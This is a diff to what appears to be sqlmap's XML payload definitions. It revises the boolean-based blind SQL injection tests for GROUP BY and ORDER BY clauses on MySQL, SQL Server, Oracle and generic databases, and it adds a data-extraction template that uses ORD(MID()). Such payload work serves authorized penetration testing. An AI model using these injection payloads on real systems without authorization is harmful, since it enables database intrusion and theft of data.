@@ -436,7 +436,7 @@ Formats:
 
     <!-- Boolean-based blind tests - GROUP BY and ORDER BY clauses -->
     <test>
-        <title>MySQL &gt;= 5.0 boolean-based blind - GROUP BY and ORDER BY clauses</title>
+        <title>MySQL &gt;= 5.0 boolean-based blind - GROUP BY and ORDER BY clauses (append)</title>
         <stype>1</stype>
         <level>3</level>
         <risk>1</risk>
@@ -444,10 +444,10 @@ Formats:
         <where>1</where>
         <epayload></epayload>
         <request>
-            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM information_schema.tables) END))</payload>
+            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM information_schema.tables) END))</payload>
         </request>
         <response>
-            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM information_schema.tables) END))</comparison>
+            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM information_schema.tables) END))</comparison>
         </response>
         <details>
             <dbms>MySQL</dbms>
@@ -456,7 +456,7 @@ Formats:
     </test>
 
     <test>
-        <title>MySQL &lt; 5.0 boolean-based blind - GROUP BY and ORDER BY clauses</title>
+        <title>MySQL &lt; 5.0 boolean-based blind - GROUP BY and ORDER BY clauses (append)</title>
         <stype>1</stype>
         <level>4</level>
         <risk>1</risk>
@@ -464,10 +464,10 @@ Formats:
         <where>1</where>
         <epayload></epayload>
         <request>
-            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END))</payload>
+            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END))</payload>
         </request>
         <response>
-            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END))</comparison>
+            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END))</comparison>
         </response>
         <details>
             <dbms>MySQL</dbms>
@@ -475,7 +475,7 @@ Formats:
     </test>
 
     <test>
-        <title>Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause</title>
+        <title>Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (append)</title>
         <stype>1</stype>
         <level>3</level>
         <risk>1</risk>
@@ -483,10 +483,10 @@ Formats:
         <where>1</where>
         <epayload></epayload>
         <request>
-            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM master..sysdatabases) END))</payload>
+            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM master..sysdatabases) END))</payload>
         </request>
         <response>
-            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM master..sysdatabases) END))</comparison>
+            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM master..sysdatabases) END))</comparison>
         </response>
         <details>
             <dbms>Microsoft SQL Server</dbms>
@@ -494,7 +494,7 @@ Formats:
     </test>
 
     <test>
-        <title>Oracle boolean-based blind - ORDER BY clause</title>
+        <title>Oracle boolean-based blind - ORDER BY clause (append)</title>
         <stype>1</stype>
         <level>3</level>
         <risk>1</risk>
@@ -502,10 +502,10 @@ Formats:
         <where>1</where>
         <epayload></epayload>
         <request>
-            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 1/0 END) FROM DUAL)</payload>
+            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE 1/0 END) FROM DUAL)</payload>
         </request>
         <response>
-            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE 1/0 END) FROM DUAL)</comparison>
+            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE 1/0 END) FROM DUAL)</comparison>
         </response>
         <details>
             <dbms>Oracle</dbms>
@@ -515,7 +515,7 @@ Formats:
     <!-- TODO: check against Microsoft Access, Firebird and SAP MaxDB -->
     <!-- NOTE: this does not behave as expected against SQLite, need to find another payload (TODO) -->
     <test>
-        <title>Generic boolean-based blind - GROUP BY and ORDER BY clauses</title>
+        <title>Generic boolean-based blind - GROUP BY and ORDER BY clauses (append)</title>
         <stype>1</stype>
         <level>3</level>
         <risk>1</risk>
@@ -523,26 +523,26 @@ Formats:
         <where>1</where>
         <epayload></epayload>
         <request>
-            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 1/0 END))</payload>
+            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE 1/0 END))</payload>
         </request>
         <response>
-            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE 1/0 END))</comparison>
+            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE 1/0 END))</comparison>
         </response>
     </test>
 
     <test>
-        <title>MySQL &gt;= 5.0 boolean-based blind - GROUP BY and ORDER BY clauses</title>
+        <title>MySQL &gt;= 5.0 boolean-based blind - GROUP BY and ORDER BY clauses (replace)</title>
         <stype>1</stype>
         <level>4</level>
         <risk>1</risk>
         <clause>2,3</clause>
         <where>3</where>
-        <epayload></epayload>
+        <epayload>(SELECT (CASE WHEN (ORD(MID((%s), %d, 1)) > %d) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM information_schema.tables) END))</epayload>
         <request>
-            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM information_schema.tables) END))</payload>
+            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM information_schema.tables) END))</payload>
         </request>
         <response>
-            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM information_schema.tables) END))</comparison>
+            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM information_schema.tables) END))</comparison>
         </response>
         <details>
             <dbms>MySQL</dbms>
@@ -551,7 +551,7 @@ Formats:
     </test>
 
     <test>
-        <title>MySQL &lt; 5.0 boolean-based blind - GROUP BY and ORDER BY clauses</title>
+        <title>MySQL &lt; 5.0 boolean-based blind - GROUP BY and ORDER BY clauses (replace)</title>
         <stype>1</stype>
         <level>5</level>
         <risk>1</risk>
@@ -559,10 +559,10 @@ Formats:
         <where>3</where>
         <epayload></epayload>
         <request>
-            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END))</payload>
+            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END))</payload>
         </request>
         <response>
-            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END))</comparison>
+            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END))</comparison>
         </response>
         <details>
             <dbms>MySQL</dbms>
@@ -570,7 +570,7 @@ Formats:
     </test>
 
     <test>
-        <title>Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause</title>
+        <title>Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (replace)</title>
         <stype>1</stype>
         <level>4</level>
         <risk>1</risk>
@@ -578,10 +578,10 @@ Formats:
         <where>3</where>
         <epayload></epayload>
         <request>
-            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM master..sysdatabases) END))</payload>
+            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM master..sysdatabases) END))</payload>
         </request>
         <response>
-            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM master..sysdatabases) END))</comparison>
+            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM master..sysdatabases) END))</comparison>
         </response>
         <details>
             <dbms>Microsoft SQL Server</dbms>
@@ -589,7 +589,7 @@ Formats:
     </test>
 
     <test>
-        <title>Oracle boolean-based blind - ORDER BY clause</title>
+        <title>Oracle boolean-based blind - ORDER BY clause (replace)</title>
         <stype>1</stype>
         <level>4</level>
         <risk>1</risk>
@@ -597,10 +597,10 @@ Formats:
         <where>3</where>
         <epayload></epayload>
         <request>
-            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 1/0 END) FROM DUAL)</payload>
+            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE 1/0 END) FROM DUAL)</payload>
         </request>
         <response>
-            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE 1/0 END) FROM DUAL)</comparison>
+            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE 1/0 END) FROM DUAL)</comparison>
         </response>
         <details>
             <dbms>Oracle</dbms>
@@ -610,7 +610,7 @@ Formats:
     <!-- TODO: check against Microsoft Access, Firebird and SAP MaxDB -->
     <!-- NOTE: this does not behave as expected against SQLite, need to find another payload (TODO) -->
     <test>
-        <title>Generic boolean-based blind - GROUP BY and ORDER BY clauses</title>
+        <title>Generic boolean-based blind - GROUP BY and ORDER BY clauses (replace)</title>
         <stype>1</stype>
         <level>4</level>
         <risk>1</risk>
@@ -618,10 +618,10 @@ Formats:
         <where>3</where>
         <epayload></epayload>
         <request>
-            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 1/0 END))</payload>
+            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE 1/0 END))</payload>
         </request>
         <response>
-            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE 1/0 END))</comparison>
+            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE 1/0 END))</comparison>
         </response>
     </test>
     <!-- End of boolean-based blind tests - GROUP BY and ORDER BY clauses -->
